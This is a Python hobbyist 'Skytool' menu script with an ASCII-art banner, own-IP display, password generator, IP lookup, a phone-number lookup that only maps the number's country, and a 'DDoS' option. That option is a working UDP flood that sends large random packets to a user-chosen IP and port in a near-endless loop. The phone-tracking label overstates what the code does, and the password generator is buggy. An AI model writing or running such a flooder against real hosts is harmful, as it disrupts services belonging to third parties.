import requests
import json
import os
import sys
import socket
import random
import pyautogui
import random
import colorama
import socket, random, time
import phonenumbers
import pycountry
import folium
import os
import pyfiglet

from colorama import Fore, Back, Style
from tqdm import tqdm
from pathlib import Path
from phonenumbers import geocoder
from phonenumbers import carrier
from phonenumbers.phonenumberutil import region_code_for_country_code
from phonenumbers.phonenumberutil import region_code_for_number
from opencage.geocoder import OpenCageGeocode

"""
    http://ip-api.com/json/IP_ADDRES
    http://www.google.com/maps/@LAT,LON,9z?hl=id
"""

host = socket.gethostname()

selection = input(host + "@Skytool :")

if selection=="help":
    print("""
    CUSTOMASCII : Print Your Ascii Art Text
    MYIP : For Checking Your IP
    IP : Fo Check Data From An Ip Address
    PWGEN : For Generate Secure Password
    DDoS : DDoS Tool
   """)

if selection=="customascii":
    ascii_banner_custom = pyfiglet.figlet_format(input("Ascii :"))
    print(ascii_banner_custom)

if selection=="credits":
    print("""
    Create By Sky Inc.
    Programmed By Sky Inc.
    """)

if selection=="myip":
    host = socket.gethostname()
    print("Device Name :", host)

    ip = socket.gethostbyname(host)
    print("Ip :",ip)

if selection=="pwgen":
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    number = "0123456789"
    symbols = "!@#$%^&*()."

    string = lower + upper + number + symbols
    lenght = input("Input The PW Lenght :")
    pwgen = "".join(random.sample(string,lenght))

    print("The Password Is :" + pwgen)

if selection=="DDoS":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = input("Enter Target IP: ")
    port = int(input("Enter Target Port: "))
    sleep = float(input("Sleep: "))
 
    s.connect((ip, port))
 
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Send: {i}", end='\r')
        time.sleep(sleep)

if selection=="ip":
    import IPGEO

if os.path.exists("mylocation.html"):
  os.remove("mylocation.html")

if selection=="trackphonenumber":
  number = input("Enter Phone Number: ")
  pn = phonenumbers.parse(number)

  country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
  location = country.name
  print(location)

  print(carrier.name_for_number(phonenumbers.parse(number), "en"))

  key = input("Enter Your API KEY: ")
  geocoder = OpenCageGeocode(key)
  query = str(location)
  results = geocoder.geocode(query)
  lat = results[0]['geometry']['lat']
  lng = results[0]['geometry']['lng']
  print(lat,lng)

  myMap = folium.Map(location=[lat , lng], zoom_start=9)
  folium.Marker([lat,lng],popup=location).add_to(myMap)
  myMap.save("mylocation.html")
  os.system("mylocation.html")